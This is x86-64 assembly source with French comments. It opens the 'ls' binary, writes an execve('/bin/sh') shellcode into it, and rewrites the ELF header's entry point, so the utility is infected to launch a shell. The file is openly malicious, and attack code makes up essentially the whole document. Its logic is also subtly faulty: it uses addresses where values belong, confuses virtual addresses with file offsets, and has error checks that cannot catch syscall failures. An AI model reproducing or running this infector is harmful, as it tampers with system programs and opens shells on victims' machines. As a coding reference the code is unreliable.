section .data
    filename db "ls", 0                  ; Nom du fichier hardcodé
    new_entrypoint dq 0x401ee0              ; Adresse virtuelle de l'emplacement du shellcode
    err_open db "Erreur : ouverture de fichier", 0
    err_write db "Erreur : ecriture dans le fichier", 0
    err_close db "Erreur : fermeture du fichier", 0

    ; Shellcode à injecter
    shellcode db 0x31, 0xC0, 0x48, 0xBB, 0xD1, 0x9D, 0x96, 0x91, 0xD0, 0x8C, 0x97, 0xFF, \
                 0x48, 0xF7, 0xDB, 0x53, 0x54, 0x5F, 0x99, 0x52, 0x57, 0x54, 0x5E, 0xB0, \
                 0x3B, 0x0F, 0x05

section .text
    global _start

_start:
    ; Ouvrir le fichier en lecture/écriture
    mov rax, 2                              ; Appel système SYS_OPEN
    mov rdi, filename                       ; Nom du fichier (hardcodé)
    mov rsi, 2                              ; Flags O_RDWR (lecture et écriture)
    syscall
    jc error_open                           ; Gérer l'erreur si l'ouverture échoue
    mov rbx, rax                            ; Sauvegarde le descripteur de fichier dans rbx

    ; Écrire le shellcode à l'emplacement new_entrypoint
    mov rax, 8                              ; Appel système SYS_LSEEK
    mov rdi, rbx                            ; Descripteur de fichier
    mov rsi, new_entrypoint                 ; Offset où écrire le shellcode
    mov rdx, 0                              ; Déplacement absolu
    syscall
    jc error_write                          ; Gérer l'erreur si l'opération échoue

    mov rax, 1                              ; Appel système SYS_WRITE
    mov rdi, rbx                            ; Descripteur de fichier
    mov rsi, shellcode                      ; Adresse du shellcode
    mov rdx, 27                             ; Taille du shellcode (27 octets)
    syscall
    jc error_write                          ; Gérer l'erreur si l'écriture échoue

    ; Mettre à jour l'entrypoint dans l'en-tête ELF
    mov rax, 8                              ; Appel système SYS_LSEEK
    mov rdi, rbx                            ; Descripteur de fichier
    mov rsi, 24                             ; Offset de l'entrypoint dans ELF64
    mov rdx, 0                              ; Déplacement absolu
    syscall
    jc error_write                          ; Gérer l'erreur si l'opération échoue

    mov rax, 1                              ; Appel système SYS_WRITE
    mov rdi, rbx                            ; Descripteur de fichier
    mov rsi, new_entrypoint                 ; Adresse du nouvel entrypoint
    mov rdx, 8                              ; Taille en octets pour un entrypoint (64 bits)
    syscall
    jc error_write                          ; Gérer l'erreur si l'écriture échoue

    ; Fermer le fichier
    mov rax, 3                              ; Appel système SYS_CLOSE
    mov rdi, rbx                            ; Descripteur de fichier
    syscall
    jc error_close                          ; Gérer l'erreur si la fermeture échoue

exit:
    mov rax, 60                             ; Appel système SYS_EXIT
    xor rdi, rdi                            ; Code de sortie 0
    syscall

error_open:
    mov rsi, err_open
    call error

error_write:
    mov rsi, err_write
    call error

error_close:
    mov rsi, err_close
    call error

error:
    mov rax, 1                              ; SYS_WRITE
    mov rdi, 1                              ; Descripteur de sortie (STDOUT)
    mov rdx, 28                             ; Taille du message d'erreur
    syscall
    jmp exit
